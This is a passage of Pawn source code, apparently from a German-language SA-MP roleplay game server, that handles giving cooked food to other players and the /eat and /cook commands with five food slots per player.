								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook3],Cooking[giveplayerid][pCWeight3]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook3],Cooking[playerid][pCWeight3],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else if(Cooking[giveplayerid][pCWeight4] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook3]);
								    strmid(Cooking[giveplayerid][pCook4], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight4] = Cooking[playerid][pCWeight3];
								    Cooking[giveplayerid][pCookID4] = Cooking[playerid][pCookID3];
								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook4],Cooking[giveplayerid][pCWeight4]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook3],Cooking[playerid][pCWeight3],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else if(Cooking[giveplayerid][pCWeight5] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook3]);
								    strmid(Cooking[giveplayerid][pCook5], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight5] = Cooking[playerid][pCWeight3];
								    Cooking[giveplayerid][pCookID5] = Cooking[playerid][pCookID3];
								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook5],Cooking[giveplayerid][pCWeight5]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook3],Cooking[playerid][pCWeight3],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else
							    {
							        SendClientMessage(playerid, COLOR_GREY, "   Der Spieler hat keinen Platz in seinem Kochbehälter !");
							        return 1;
							    }
							}
							case 4:
							{
							    if(Cooking[giveplayerid][pCWeight1] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook4]);
								    strmid(Cooking[giveplayerid][pCook1], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight1] = Cooking[playerid][pCWeight4];
								    Cooking[giveplayerid][pCookID1] = Cooking[playerid][pCookID4];
								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook1],Cooking[giveplayerid][pCWeight1]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook4],Cooking[playerid][pCWeight4],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else if(Cooking[giveplayerid][pCWeight2] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook4]);
								    strmid(Cooking[giveplayerid][pCook2], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight2] = Cooking[playerid][pCWeight4];
								    Cooking[giveplayerid][pCookID2] = Cooking[playerid][pCookID4];
								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook2],Cooking[giveplayerid][pCWeight2]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook4],Cooking[playerid][pCWeight4],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else if(Cooking[giveplayerid][pCWeight3] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook4]);
								    strmid(Cooking[giveplayerid][pCook3], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight3] = Cooking[playerid][pCWeight4];
								    Cooking[giveplayerid][pCookID3] = Cooking[playerid][pCookID4];
								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook3],Cooking[giveplayerid][pCWeight3]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook4],Cooking[playerid][pCWeight4],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else if(Cooking[giveplayerid][pCWeight4] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook4]);
								    strmid(Cooking[giveplayerid][pCook4], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight4] = Cooking[playerid][pCWeight4];
								    Cooking[giveplayerid][pCookID4] = Cooking[playerid][pCookID4];
								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook4],Cooking[giveplayerid][pCWeight4]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook4],Cooking[playerid][pCWeight4],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else if(Cooking[giveplayerid][pCWeight5] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook4]);
								    strmid(Cooking[giveplayerid][pCook5], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight5] = Cooking[playerid][pCWeight4];
								    Cooking[giveplayerid][pCookID5] = Cooking[playerid][pCookID4];
								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook5],Cooking[giveplayerid][pCWeight5]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook4],Cooking[playerid][pCWeight4],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else
							    {
							        SendClientMessage(playerid, COLOR_GREY, "   Der Spieler hat keinen Platz in seinem Kochbehälter !");
							        return 1;
							    }
							}
							case 5:
							{
							    if(Cooking[giveplayerid][pCWeight1] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook5]);
								    strmid(Cooking[giveplayerid][pCook1], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight1] = Cooking[playerid][pCWeight5];
								    Cooking[giveplayerid][pCookID1] = Cooking[playerid][pCookID5];
								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook1],Cooking[giveplayerid][pCWeight1]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook5],Cooking[playerid][pCWeight5],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else if(Cooking[giveplayerid][pCWeight2] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook5]);
								    strmid(Cooking[giveplayerid][pCook2], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight2] = Cooking[playerid][pCWeight5];
								    Cooking[giveplayerid][pCookID2] = Cooking[playerid][pCookID5];
								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook2],Cooking[giveplayerid][pCWeight2]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook5],Cooking[playerid][pCWeight5],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else if(Cooking[giveplayerid][pCWeight3] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook5]);
								    strmid(Cooking[giveplayerid][pCook3], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight3] = Cooking[playerid][pCWeight5];
								    Cooking[giveplayerid][pCookID3] = Cooking[playerid][pCookID5];
								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook3],Cooking[giveplayerid][pCWeight3]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook5],Cooking[playerid][pCWeight5],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else if(Cooking[giveplayerid][pCWeight4] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook5]);
								    strmid(Cooking[giveplayerid][pCook4], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight4] = Cooking[playerid][pCWeight5];
								    Cooking[giveplayerid][pCookID4] = Cooking[playerid][pCookID5];
								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook4],Cooking[giveplayerid][pCWeight4]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook5],Cooking[playerid][pCWeight5],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else if(Cooking[giveplayerid][pCWeight5] < 1)
							    {
							        format(string, sizeof(string), "%s", Cooking[playerid][pCook5]);
								    strmid(Cooking[giveplayerid][pCook5], string, 0, strlen(string), 255);
								    Cooking[giveplayerid][pCWeight5] = Cooking[playerid][pCWeight5];
								    Cooking[giveplayerid][pCookID5] = Cooking[playerid][pCookID5];
								    format(string, sizeof(string), "* %s hat dir %s mit dem Gewicht %d gegeben (benutze /cooked um die Übersicht zu sehen).",sendername,Cooking[giveplayerid][pCook5],Cooking[giveplayerid][pCWeight5]);
								    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								    format(string, sizeof(string), "* Du hast %s mit dem Gewicht %d an %s gegeben.",Cooking[playerid][pCook5],Cooking[playerid][pCWeight5],giveplayer);
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							    }
							    else
							    {
							        SendClientMessage(playerid, COLOR_GREY, "   Der Spieler hat keinen Platz in seinem Kochbehälter !");
							        return 1;
							    }
							}
				        }//switch
				        ClearCookingID(playerid, cookid);
				    }//invalid giveplayerid
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline !");
				    return 1;
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Unbekannter /sell-Name!");
			    return 1;
			}
		}
		return 1;
	}

 	if(strcmp(cmd,"/eat",true)==0)
    {
        if(IsPlayerConnected(playerid))
	    {
	        if(PlayerBoxing[playerid] > 0)
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Du kannst während dem Boxkampf nichts essen !");
	            return 1;
	        }
	        tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp)) {
				SendClientMessage(playerid, COLOR_WHITE, "NUTZUNG: /eat [cook number]");
				return 1;
			}
			new cookid = strval(tmp);
			if(cookid < 1 || cookid > 5) { SendClientMessage(playerid, COLOR_GREY, "   Kochnummer muss zwischen 1 und 5 liegen!"); return 1; }
			else if(cookid == 1 && Cooking[playerid][pCWeight1] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Du hast noch keine Speisen in Kochnummer 1 !"); return 1; }
			else if(cookid == 2 && Cooking[playerid][pCWeight2] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Du hast noch keine Speisen in Kochnummer 2 !"); return 1; }
			else if(cookid == 3 && Cooking[playerid][pCWeight3] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Du hast noch keine Speisen in Kochnummer 3 !"); return 1; }
			else if(cookid == 4 && Cooking[playerid][pCWeight4] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Du hast noch keine Speisen in Kochnummer 4 !"); return 1; }
			else if(cookid == 5 && Cooking[playerid][pCWeight5] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Du hast noch keine Speisen in Kochnummer 5 !"); return 1; }
            GetPlayerName(playerid, sendername, sizeof(sendername));
			new Float:health;
			if(GetPlayerHealth(playerid, health) < 40)
			{
			    new hp = 0;
			    switch (cookid)
			    {
					case 1:
					{
//					    if(Cooking[playerid][pCookID1] == 16 || Cooking[playerid][pCookID1] == 18)
//						{//Dolphin or Turtle
//						    WantedPoints[playerid] += 2;
//							SetPlayerCriminal(playerid,255, "Konsum einer gefährdeten Spezies");
//						}
					    SetPlayerHealth(playerid, health + (Cooking[playerid][pCWeight1] / 3));// Anwalt System verbuggt Animationen
					    hp = Cooking[playerid][pCWeight1];
					    format(string, sizeof(string), "* %s isst einen gekochten %s.", sendername, Cooking[playerid][pCook1]);
						ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					    format(string, sizeof(string), "* Du hast einen gekochten %s (%d LBS) gegessen, es wurde deiner Gesundheit hinzugefügt.",Cooking[playerid][pCook1], hp);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					}
					case 2:
					{
//					    if(Cooking[playerid][pCookID2] == 16 || Cooking[playerid][pCookID2] == 18)
//						{//Dolphin or Turtle
//						    WantedPoints[playerid] += 2;
//							SetPlayerCriminal(playerid,255, "Konsum einer gefährdeten Spezies");
//						}
					    SetPlayerHealth(playerid, health + (Cooking[playerid][pCWeight2] / 3));
					    hp = Cooking[playerid][pCWeight2];
					    format(string, sizeof(string), "* %s isst einen gekochten %s.", sendername, Cooking[playerid][pCook2]);
						ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					    format(string, sizeof(string), "* Du hast einen gekochten %s (%d LBS) gegessen, es wurde deiner Gesundheit hinzugefügt.",Cooking[playerid][pCook2], hp);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					}
					case 3:
					{
//					    if(Cooking[playerid][pCookID3] == 16 || Cooking[playerid][pCookID3] == 18)
//						{//Dolphin or Turtle
//						    WantedPoints[playerid] += 2;
//							SetPlayerCriminal(playerid,255, "Konsum einer gefährdeten Spezies");
//						}
					    SetPlayerHealth(playerid, health + (Cooking[playerid][pCWeight3] / 3));
					    hp = Cooking[playerid][pCWeight3];
					    format(string, sizeof(string), "* %s isst einen gekochten %s.", sendername, Cooking[playerid][pCook3]);
						ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					    format(string, sizeof(string), "* Du hast einen gekochten %s (%d LBS) gegessen, es wurde deiner Gesundheit hinzugefügt.",Cooking[playerid][pCook3], hp);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					}
					case 4:
					{
//					    if(Cooking[playerid][pCookID4] == 16 || Cooking[playerid][pCookID4] == 18)
//						{//Dolphin or Turtle
//						    WantedPoints[playerid] += 2;
//							SetPlayerCriminal(playerid,255, "Konsum einer gefährdeten Spezies");
//						}
					    SetPlayerHealth(playerid, health + (Cooking[playerid][pCWeight4] / 3));
					    hp = Cooking[playerid][pCWeight4];
					    format(string, sizeof(string), "* %s isst einen gekochten %s.", sendername, Cooking[playerid][pCook4]);
						ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					    format(string, sizeof(string), "* Du hast einen gekochten %s (%d LBS) gegessen, es wurde deiner Gesundheit hinzugefügt.",Cooking[playerid][pCook4], hp);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					}
					case 5:
					{
//					    if(Cooking[playerid][pCookID5] == 16 || Cooking[playerid][pCookID5] == 18)
//						{//Dolphin or Turtle
//						    WantedPoints[playerid] += 2;
//							SetPlayerCriminal(playerid,255, "Konsum einer gefährdeten Spezies");
//						}
					    SetPlayerHealth(playerid, health + (Cooking[playerid][pCWeight5] / 3));
					    hp = Cooking[playerid][pCWeight5];
					    format(string, sizeof(string), "* %s isst einen gekochten %s.", sendername, Cooking[playerid][pCook5]);
						ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					    format(string, sizeof(string), "* Du hast einen gekochten %s (%d LBS) gegessen, es wurde deiner Gesundheit hinzugefügt.",Cooking[playerid][pCook5], hp);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					}
			    }
				ClearCookingID(playerid, cookid);
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Du hast genug HP (nur unter 40)!");
			    return 1;
			}
	    }
	    return 1;
	}
 	if(strcmp(cmd,"/cook",true)==0)
    {
        if(IsPlayerConnected(playerid))
	    {
	        if(IsAtCookPlace(playerid))
	        {
	            new x_nr[256];
	            x_nr = strtoknew(cmdtext, idx);
				if(!strlen(x_nr)) {
					SendClientMessage(playerid, COLOR_WHITE, "NUTZUNG: /cook [name]");
					SendClientMessage(playerid, COLOR_WHITE, "Verfügbare Namen: letzter Fisch, Fisch, Huhn, Hamburger, Pizza.");
					return 1;
				}
				if(strcmp(x_nr,"letzter Fisch",true) == 0)
				{
				    if(Fishes[playerid][pLastFish] > 0)
	        		{
					    new found = 0;
					    if(Cooking[playerid][pCWeight1] == 0)
					    {
						    format(string, sizeof(string), "Gekochte/r/s %s", FishNames[Fishes[playerid][pFishID]]);
						    strmid(Cooking[playerid][pCook1], string, 0, strlen(string), 255);
						    Cooking[playerid][pCWeight1] = Fishes[playerid][pLastWeight];
						    Cooking[playerid][pCookID1] = Fishes[playerid][pFishID];
						    format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook1],Cooking[playerid][pCWeight1]);
						    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						    found = 1;
					    }
					    else if(Cooking[playerid][pCWeight2] == 0)
					    {
						    format(string, sizeof(string), "Gekochte/r/s %s", FishNames[Fishes[playerid][pFishID]]);
						    strmid(Cooking[playerid][pCook2], string, 0, strlen(string), 255);
						    Cooking[playerid][pCWeight2] = Fishes[playerid][pLastWeight];
						    Cooking[playerid][pCookID2] = Fishes[playerid][pFishID];
						    format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook2],Cooking[playerid][pCWeight2]);
						    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						    found = 1;
					    }
					    else if(Cooking[playerid][pCWeight3] == 0)
					    {
						    format(string, sizeof(string), "Gekochte/r/s %s", FishNames[Fishes[playerid][pFishID]]);
						    strmid(Cooking[playerid][pCook3], string, 0, strlen(string), 255);
						    Cooking[playerid][pCWeight3] = Fishes[playerid][pLastWeight];
						    Cooking[playerid][pCookID3] = Fishes[playerid][pFishID];
						    format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook3],Cooking[playerid][pCWeight3]);
						    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						    found = 1;
					    }
					    else if(Cooking[playerid][pCWeight4] == 0)
					    {
						    format(string, sizeof(string), "Gekochte/r/s %s", FishNames[Fishes[playerid][pFishID]]);
						    strmid(Cooking[playerid][pCook4], string, 0, strlen(string), 255);
						    Cooking[playerid][pCWeight4] = Fishes[playerid][pLastWeight];
						    Cooking[playerid][pCookID4] = Fishes[playerid][pFishID];
						    format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook4],Cooking[playerid][pCWeight4]);
						    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						    found = 1;
					    }
					    else if(Cooking[playerid][pCWeight5] == 0)
					    {
						    format(string, sizeof(string), "Gekochte/r/s %s", FishNames[Fishes[playerid][pFishID]]);
						    strmid(Cooking[playerid][pCook5], string, 0, strlen(string), 255);
						    Cooking[playerid][pCWeight5] = Fishes[playerid][pLastWeight];
						    Cooking[playerid][pCookID5] = Fishes[playerid][pFishID];
						    format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook5],Cooking[playerid][pCWeight5]);
						    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						    found = 1;
					    }
					    else
					    {
					        SendClientMessage(playerid, COLOR_GREY, "   Du hast keinen Platz in deinem Kochbehälter!");
					        return 1;
					    }
					    if(found)
					    {
					        ClearFishID(playerid, Fishes[playerid][pLastFish]);
				            Fishes[playerid][pLastFish] = 0;
				            Fishes[playerid][pFishID] = 0;
					    }
				    }
				    else
				    {
				        SendClientMessage(playerid, COLOR_GREY, "   Du hast bis jetzt keine Fische gefangen!");
				        return 1;
				    }
				}
				else if(strcmp(x_nr,"Fisch",true) == 0)
				{
				    new found = 0;
				    tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
						SendClientMessage(playerid, COLOR_WHITE, "Benutze: /cook Fisch [Fischnumner]");
						return 1;
					}
					new fishid = strval(tmp);
					if(fishid < 1 || fishid > 5) { SendClientMessage(playerid, COLOR_GREY, "   Fischnummer muss zwischen 1 und 5 liegen!"); return 1; }
					else if(fishid == 1 && Fishes[playerid][pWeight1] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Du hast keinen gefangenen Fisch in Nummer 1 !"); return 1; }
					else if(fishid == 2 && Fishes[playerid][pWeight2] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Du hast keinen gefangenen Fisch in Nummer 2 !"); return 1; }
					else if(fishid == 3 && Fishes[playerid][pWeight3] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Du hast keinen gefangenen Fisch in Nummer 3 !"); return 1; }
					else if(fishid == 4 && Fishes[playerid][pWeight4] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Du hast keinen gefangenen Fisch in Nummer 4 !"); return 1; }
					else if(fishid == 5 && Fishes[playerid][pWeight5] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Du hast keinen gefangenen Fisch in Nummer 5 !"); return 1; }
					if(Cooking[playerid][pCWeight1] == 0)
					{
					    if(fishid == 1)
					    {
						    format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish1]);
						    strmid(Cooking[playerid][pCook1], string, 0, strlen(string), 255);
						    Cooking[playerid][pCWeight1] = Fishes[playerid][pWeight1];
						    Cooking[playerid][pCookID1] = Fishes[playerid][pFid1];
						    format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook1],Cooking[playerid][pCWeight1]);
					    	SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
					    }
						else if(fishid == 2)
					 	{
						    format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish2]);
						    strmid(Cooking[playerid][pCook1], string, 0, strlen(string), 255);
						    Cooking[playerid][pCWeight1] = Fishes[playerid][pWeight2];
						    Cooking[playerid][pCookID1] = Fishes[playerid][pFid2];
						    format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook1],Cooking[playerid][pCWeight1]);
						    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						}
						else if(fishid == 3)
						{
						    format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish3]);
						    strmid(Cooking[playerid][pCook1], string, 0, strlen(string), 255);
						    Cooking[playerid][pCWeight1] = Fishes[playerid][pWeight3];
						    Cooking[playerid][pCookID1] = Fishes[playerid][pFid3];
						    format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook1],Cooking[playerid][pCWeight1]);
						    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						}
						else if(fishid == 4)
						{
						    format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish4]);
						    strmid(Cooking[playerid][pCook1], string, 0, strlen(string), 255);
						    Cooking[playerid][pCWeight1] = Fishes[playerid][pWeight4];
						    Cooking[playerid][pCookID1] = Fishes[playerid][pFid4];
						    format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook1],Cooking[playerid][pCWeight1]);
						    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						}
						else if(fishid == 5)
						{
						    format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish5]);
						    strmid(Cooking[playerid][pCook1], string, 0, strlen(string), 255);
						    Cooking[playerid][pCWeight1] = Fishes[playerid][pWeight5];
						    Cooking[playerid][pCookID1] = Fishes[playerid][pFid5];
						    format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook1],Cooking[playerid][pCWeight1]);
						    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						}
						found = 1;
		    		}
					else if(Cooking[playerid][pCWeight2] == 0)
					{
						if(fishid == 1)
					    {
							format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish1]);
							strmid(Cooking[playerid][pCook2], string, 0, strlen(string), 255);
							Cooking[playerid][pCWeight2] = Fishes[playerid][pWeight1];
							Cooking[playerid][pCookID2] = Fishes[playerid][pFid1];
							format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook2],Cooking[playerid][pCWeight2]);
							SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
			    		}
						else if(fishid == 2)
						{
						    format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish2]);
						    strmid(Cooking[playerid][pCook2], string, 0, strlen(string), 255);
						    Cooking[playerid][pCWeight2] = Fishes[playerid][pWeight2];
						    Cooking[playerid][pCookID2] = Fishes[playerid][pFid2];
						    format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook2],Cooking[playerid][pCWeight2]);
						    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						}
						else if(fishid == 3)
						{
						    format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish3]);
						    strmid(Cooking[playerid][pCook2], string, 0, strlen(string), 255);
						    Cooking[playerid][pCWeight2] = Fishes[playerid][pWeight3];
						    Cooking[playerid][pCookID2] = Fishes[playerid][pFid3];
						    format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook2],Cooking[playerid][pCWeight2]);
						    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						}
						else if(fishid == 4)
						{
						    format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish4]);
						    strmid(Cooking[playerid][pCook2], string, 0, strlen(string), 255);
						    Cooking[playerid][pCWeight2] = Fishes[playerid][pWeight4];
						    Cooking[playerid][pCookID2] = Fishes[playerid][pFid4];
						    format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook2],Cooking[playerid][pCWeight2]);
						    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						}
						else if(fishid == 5)
						{
						    format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish5]);
						    strmid(Cooking[playerid][pCook2], string, 0, strlen(string), 255);
						    Cooking[playerid][pCWeight2] = Fishes[playerid][pWeight5];
						    Cooking[playerid][pCookID2] = Fishes[playerid][pFid5];
						    format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook2],Cooking[playerid][pCWeight2]);
						    SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
						}
						found = 1;
		    		}
					else if(Cooking[playerid][pCWeight3] == 0)
					{
						if(fishid == 1)
					    {
							format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish1]);
							strmid(Cooking[playerid][pCook3], string, 0, strlen(string), 255);
							Cooking[playerid][pCWeight3] = Fishes[playerid][pWeight1];
							Cooking[playerid][pCookID3] = Fishes[playerid][pFid1];
							format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook3],Cooking[playerid][pCWeight3]);
							SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
			    		}
						else if(fishid == 2)
						{
							format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish2]);
							strmid(Cooking[playerid][pCook3], string, 0, strlen(string), 255);
							Cooking[playerid][pCWeight3] = Fishes[playerid][pWeight2];
							Cooking[playerid][pCookID3] = Fishes[playerid][pFid2];
							format(string, sizeof(string), "* Du hast %s (LBS: %d) gekocht.",Cooking[playerid][pCook3],Cooking[playerid][pCWeight3]);
							SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
    					}
						else if(fishid == 3)
						{
							format(string, sizeof(string), "Gekochte/r/s %s", Fishes[playerid][pFish3]);
							strmid(Cooking[playerid][pCook3], string, 0, strlen(string), 255);
							Cooking[playerid][pCWeight3] = Fishes[playerid][pWeight3];
							Cooking[playerid][pCookID3] = Fishes[playerid][pFid3];
